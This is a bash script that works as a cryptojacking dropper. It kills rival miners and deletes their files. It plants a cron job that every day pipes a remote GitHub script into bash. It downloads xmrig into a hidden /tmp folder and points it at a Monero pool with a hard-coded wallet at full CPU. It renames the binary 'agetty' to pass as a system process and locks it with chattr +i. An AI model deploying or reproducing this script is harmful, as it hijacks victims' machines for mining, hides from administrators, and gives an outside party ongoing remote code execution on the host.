#!/bin/bash

# init
chattr -i /tmp/.x/agetty
ps -ef | grep "/tmp/.x/agetty" | awk '{print $2}'|  xargs -I % kill -9 %
ps -ef | grep "/tmp/.xmrig/xmrig" | awk '{print $2}'|  xargs -I % kill -9 %
pkill -9 xmrig
pkill -9 xmrig64
pkill -9 pux
pkill -9 testm
pkill -9 miner
pkill -9 network
pkill -9 networkd
pkill -9 unitex
rm -rf /tmp/.xmrig/
rm -rf /tmp/.x/
echo "50 12 * * * curl -sL https://raw.githubusercontent.com/lollouuuw/test/main/test | bash" | crontab -

# download xmr
if ! wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz -O /tmp/1.tar.gz --no-check-certificate; then
  echo "ERROR: Can't download https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi
# tar gz
if ! tar xf /tmp/1.tar.gz -C /tmp/; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
  rm /tmp/1.tar.gz /tmp/2.sh
  exit 1
fi
# rname
mv /tmp/xmrig-6.15.0 /tmp/.x

if [ -f /tmp/.x/xmrig ]; then
    echo "WARNING: xmrig is ok"
else
    echo "WARNING: xmrig was removed by antivirus (or some other problem)"
fi



# port
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}


PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# config
rm /tmp/1.tar.gz 
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /tmp/.x/config.json
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /tmp/.x/config.json
sed -i 's/"user": *"[^"]*",/"user": "86dKzpUoSZMbk5gmAnR9CThGn5hTfcqKqBpQdGogwRRiN8FUpcS8kZFW3t5GnWY879Vwidm8DcTUgZLjf8ySvUhc6ymb3Pu",/' /tmp/.x/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "x",/' /tmp/.x/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' /tmp/.x/config.json
sed -i 's#"log-file": *null,#"log-file": "'/tmp/.x/xmrig.log'",#' /tmp/.x/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /tmp/.x/config.json
sed -i 's/"background": *false,/"background": true,/' /tmp/.x/config.json


# agetty.sh
cat >/tmp/.x/agetty.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  mv /tmp/.x/xmrig /tmp/.x/agetty
  chattr +i /tmp/.x/agetty
  nice /tmp/.x/agetty \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x /tmp/.x/agetty.sh
# run
# /bin/bash /tmp/.x/agetty.sh --config=/tmp/.x/config.json >/dev/null 2>&1
/bin/bash /tmp/.x/agetty.sh
echo "[*] Setup complete"
exit 1
